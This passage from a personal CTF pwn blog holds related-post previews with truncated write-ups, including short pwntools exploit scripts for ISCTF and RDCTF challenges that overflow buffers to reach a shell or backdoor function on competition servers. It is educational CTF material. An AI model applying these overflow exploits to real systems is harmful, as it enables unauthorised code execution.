class="info-item-1">Magic_gadget经过我师傅的一阵敲打，发现自己还是不能放松下来，还是有很多不足的。所以后续一段时间的文章，都是摘自我师傅博客后自己的理解。 这篇文章的原链接是：Magic_gadget | Hexo 1._do_global_dtors_aux函数常见于编译后的二进制文件（尤其是 C&#x2F;C++ 程序），它与全局对象析构和程序终止时的清理逻辑相关。说明是这个函数普遍存在于二进制文件中。2._libc_csu_init 作为初始化函数,普遍存在于二进制文件中。 所以本文的手法，就是基于通过上面两个函数的结合来达到的。 我们现在看一下_do_global_dtors_aux函数在ida里的具体体现。 12345678910.text:00000000004011C0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o.text:00000000004011C0                 endbr64.te...</div></div></div></a><a class="pagination-related" href="/2025/12/11/ISCTF/" title="ISCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">ISCTF</div></div><div class="info-2"><div class="info-item-1">ISCTF1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。 下面给出exp。 12345678from pwn import *io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,25138)pl = b&#x27;a&#x27; * 108 + p32(0xaddaaaaa)io.sendafter(b&#x27;do you like blueshark?&#x27;,pl)io.interactive()  2.Fmt 经典的格式化字符串泄露。但是这里需要换一下附件的依赖。 由于这里给了libc.so.6，所以我们可...</div></div></div></a><a class="pagination-related" href="/2026/03/26/Nepctf2025/" title="Nepctf2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-26</div><div class="info-item-2">Nepctf2025</div></div><div class="info-2"><div class="info-item-1">Nepctf2025链接：nep2025 | Hexo 1.Time12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF  newthread[1] = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  sub_2A31();  while ( 1 )  &#123;    while ( !(unsigned int)sub_2B0F() )      ;    pthread_create(newthread, 0LL, (void *(*)(void *))start_routine, 0LL);  &#125;&#125;  程序的逻辑很简单。就是一个多线程竞争。 123456789101112131415161718...</div></div></div></a><a class="pagination-related" href="/2026/01/20/RDCTF/" title="RDCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-20</div><div class="info-item-2">RDCTF</div></div><div class="info-2"><div class="info-item-1">RDCTF1.Ret2text简单的pwn的入门题。 func函数里有read函数的栈溢出，溢出字节大小为0x20。 1234567int func()&#123;  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF  read(0, buf, 0x50uLL);  return puts(&quot;you may be forgot something~&quot;);&#125;  同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。 下面给出exp。 1234567891011from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;121.29.138.132&#x27;,30120)#io = process(&#x27;./pwn&#x27;)backdoor = 0x401269io.recvuntil(b&#x27;input:&#x27;)pl = b&#x27;a&#x27;*0x38 + p64(backdoor)io...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/24/Only-read/" title="Only_read">Only_read</a><time datetime="2026-04-24T15:28:47.000Z" title="发表于 2026-04-24 23:28:47">2026-04-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/19/ret2gets/" title="ret2gets">ret2gets</a><time datetime="2026-04-19T09:47:37.000Z" title="发表于 2026-04-19 17:47:37">2026-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/17/%E6%B5%8B%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4/" title="测信道爆破">测信道爆破</a><time datetime="2026-04-17T13:02:25.000Z" title="发表于 2026-04-17 21:02:25">2026-04-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/15/House%20of%20orange&amp;House%20of%20cat/" title="House of orange &amp; House of cat">House of orange &amp; House of cat</a><time datetime="2026-04-15T08:27:22.000Z" title="发表于 2026-04-15 16:27:22">2026-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/NCTF2026/" title="NCTF2026">NCTF2026</a><time datetime="2026-04-06T12:59:23.000Z" title="发表于 2026-04-06 20:59:23">2026-04-06</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.3em; color: #99a1ac">pwn入门</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.3em; color: #99a1ac">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">29</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-25T04:53:35.901Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
